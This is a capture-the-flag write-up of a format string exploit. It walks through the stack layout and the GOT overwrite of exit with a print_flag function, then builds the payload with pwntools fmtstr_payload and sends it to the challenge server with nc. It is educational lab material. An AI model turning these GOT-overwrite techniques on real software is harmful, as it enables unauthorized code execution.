# Write-up

# ![](/assets/problem-statement.png)

---

Exploit a format string vulnerability

Flag: **gigem{F0RM@1NG\_1S\_H4RD}**

## Analysis

Suppose we run  the program with the string `AAAAAAAAAAAAAA`

When the program is on `printf`,

![](/assets/at-printf.png)

The stack looks like:

```
BFFFEDC0  BFFFEDD0  MEMORY:BFFFEDD0  <--- ESP (Pointer to our string)
BFFFEDC4  00000002  MEMORY:00000002  Dword 1
BFFFEDC8  00000000  MEMORY:00000000  Dword 2
BFFFEDCC  00000000  MEMORY:00000000  Dword 3
BFFFEDD0  41414141  MEMORY:41414141  <--- Our entered string
BFFFEDD4  41414141  MEMORY:41414141
BFFFEDD8  41414141  MEMORY:41414141
BFFFEDDC  00004141  MEMORY:00004141
```

* The top of the stack contains the pointer \(address\) to our entered string.
* After that there are 3 dwords \(12 bytes\) and then our string begins.

Thus when exploiting, our entered string can be considered as the 4th parameter to printf.

The function which prints the flag is located at `080485AB`. It is not called anywhere by the program. We have to somehow redirect the execution flow to there so that it prints our flag.

```nasm
.text:080485AB public print_flag
.text:080485AB print_flag proc near
.text:080485AB
.text:080485AB var_D= byte ptr -0Dh
.text:080485AB fp= dword ptr -0Ch
.text:080485AB
.text:080485AB push    ebp
.text:080485AC mov     ebp, esp
.text:080485AE sub     esp, 18h
.text:080485B1 sub     esp, 0Ch
.text:080485B4 push    offset s                        ; "This function has been deprecated"
.text:080485B9 call    _puts
.text:080485BE add     esp, 10h
.text:080485C1 sub     esp, 8
.text:080485C4 push    offset modes                    ; "r"
.text:080485C9 push    offset filename                 ; "flag.txt"
.text:080485CE call    _fopen
```

The Global Offset Table looks like:

```
.got.plt:0804A00C 64 A0 04 08 off_804A00C dd offset printf ; DATA XREF: _printfr
.got.plt:0804A010 68 A0 04 08 off_804A010 dd offset gets ; DATA XREF: _getsr
.got.plt:0804A014 6C A0 04 08 off_804A014 dd offset _IO_getc ; DATA XREF: __IO_getcr
.got.plt:0804A018 70 A0 04 08 off_804A018 dd offset puts ; DATA XREF: _putsr
.got.plt:0804A01C 74 A0 04 08 off_804A01C dd offset exit ; DATA XREF: _exitr
.got.plt:0804A020 78 A0 04 08 off_804A020 dd offset __libc_start_main
```

Later in the program after `printf` returns `exit` is called.   
If we modify the address of `exit` in the GOT with that of `print_flag`, it would be executed and we would get our flag.

The entry of `exit` in the GOT is at `0804A01C` and it contains the bytes `74 A0 04 08`.    
The address of `print_flag` in little endian byte order is `AB 85 04 08`.   
Hence we would only need to write the two bytes `AB 85` , as the remaining two are already properly set up.

Summarizing, 

Write`0xAB`  \(171\) to `0804A01C`  
Write `0x85` \(133\) to `0804A01D`

Since 133 &lt; 171, we can write 133 at `0804A01D` followed by 171 at `0804A01C`.   
\(The reverse is also possible where we have to use wrap around\)

```
	-------------8 bytes------------
	|               |              |
	|  1st address  | 2nd address  |
	|               |              |
	\x1d\xa0\x04\x08\x1c\xa0\x04\x08
```





## Using pwntools \(automated\)

**Generate the exploit**

First parameter \(4\) indicates that the string is the 4th parameter.  
See the [pwntools docs](http://python3-pwntools.readthedocs.io/en/latest/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) for more info.

```py
from pwnlib.fmtstr import fmtstr_payload
open('exploit', 'w').write(fmtstr_payload(4, {0x0804a01c: 0x080485ab}, write_size='byte'))
```

**Profit :\)**

```bash
$ nc pwn.ctf.tamu.edu 4323 < exploit
Enter a word to be echoed:
����                       This function has been deprecated
gigem{F0RM@1NG_1S_H4RD}
```



